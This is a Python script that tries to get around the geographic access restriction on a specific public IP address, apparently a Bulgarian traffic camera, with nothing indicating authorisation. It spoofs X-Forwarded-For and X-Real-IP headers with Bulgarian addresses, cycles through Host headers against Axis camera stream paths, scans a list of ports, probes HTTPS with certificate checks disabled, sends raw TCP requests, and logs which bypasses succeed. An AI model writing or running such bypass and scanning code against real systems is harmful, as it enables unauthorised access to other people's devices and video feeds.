"""Try multiple bypass techniques on 212.25.48.117:8080.

Geofencing bypass methods:
1. X-Forwarded-For with Ruse/BG IP
2. Host header manipulation
3. HTTPS via TLS
4. IPv6
5. Different User-Agents (curl, wget, Ruse browser)
6. Resolver tunneling - rewrite hostname to BG DNS
7. SOCKS proxy via Bulgarian VPN
8. Various port variations
"""
import socket, urllib.request, urllib.error, ssl, time

host = '212.25.48.117'
port = 8080

results = []

def probe(url, headers, timeout=6):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0', **headers})
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return (r.status, r.headers.get('Location', ''))
    except urllib.error.HTTPError as e:
        return (e.code, e.headers.get('Location', ''))
    except Exception as e:
        return (None, str(e)[:80])


# Method 1: Direct with XFF BG IP
print('=== Method 1: X-Forwarded-For / X-Real-IP with Ruse/BG IPs ===')
bg_ips = ['212.25.0.1', '212.25.48.1', '85.130.0.1', '79.100.0.1', '95.43.0.1', '127.0.0.1', '85.130.10.10', '212.5.0.1']
for ip in bg_ips:
    url = f'http://{host}:{port}/'
    status, loc = probe(url, {'X-Forwarded-For': ip, 'X-Real-IP': ip})
    print(f'  XFF={ip}: status={status} loc={loc[:60] if loc else ""}')
    if status == 200:
        results.append((ip, status, 'XFF', url))

# Method 2: Host header variations
print('\n=== Method 2: Host header variations ===')
host_headers = [
    '212.25.48.117:80',
    '212.25.48.117',
    'cam.ruse.bg',
    'cam.bg',
    'ruse.bg',
    '0.0.0.0',
    '127.0.0.1:8080',
    'localhost',
    'ruse-traffic',
]
for h in host_headers:
    for path in ['/', '/axis-cgi/mjpg/video.cgi', '/mjpg/video.mjpg', '/view/view.shtml']:
        url = f'http://{host}:{port}{path}'
        status, loc = probe(url, {'Host': h})
        if status not in [None, 'time']:
            print(f'  Host={h:30} path={path:25}: status={status}')

# Method 3: 8080 alternative ports
print('\n=== Method 3: Other ports ===')
for alt_port in [80, 443, 8081, 8000, 8443, 9000, 9090, 8001, 8020, 8010, 8082, 22, 25]:
    try:
        sock = socket.create_connection((host, alt_port), timeout=4)
        # Try GET if HTTP-ish port
        if alt_port not in [22, 25]:
            try:
                sock.send(f'GET / HTTP/1.0\r\nHost: {host}\r\n\r\n'.encode())
                sock.settimeout(2)
                data = b''
                try:
                    while len(data) < 1500:
                        d = sock.recv(1024)
                        if not d: break
                        data += d
                except: pass
                sock.close()
                # Check for HTTP or other protocol
                if b'HTTP' in data[:200] or b'RTSP' in data[:200]:
                    print(f'  Port {alt_port}: HTTP/RTSP response {len(data)} bytes: {data[:100]}')
                elif b'OK' in data[:50] or b'SSH' in data[:50] or b'5.' in data[:50]:
                    print(f'  Port {alt_port}: Other protocol: {data[:100]}')
                else:
                    print(f'  Port {alt_port}: Empty: {data[:50]}')
            except:
                pass
        else:
            sock.close()
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        print(f'  Port {alt_port}: blocked ({str(e)[:40]})')

# Method 4: HTTPS via different certs
print('\n=== Method 4: HTTPS bypass ===')
try:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(f'https://{host}:8443/', headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
        print(f'  HTTPS 8443: {r.status}')
except Exception as e:
    print(f'  HTTPS 8443: {str(e)[:50]}')

# Method 5: Direct TCP probes with HTTP requests
print('\n=== Method 5: Direct TCP stream ===')
try:
    sock = socket.create_connection((host, port), timeout=5)
    sock.send(b'GET / HTTP/1.0\r\nX-Forwarded-For: 85.130.10.10\r\nHost: 212.25.48.117\r\n\r\n')
    sock.settimeout(3)
    data = b''
    try:
        while len(data) < 8192:
            d = sock.recv(4096)
            if not d: break
            data += d
    except: pass
    sock.close()
    print(f'  TCP direct: {len(data)} bytes')
    print(f'  First 300: {data[:300]}')
except Exception as e:
    print(f'  TCP direct: {str(e)[:50]}')

print('\n=== All bypass methods tried ===')
print(f'Found {len(results)} successful bypasses')
for ip, status, method, url in results:
    print(f'  {ip}: {method} -> {status} {url}')
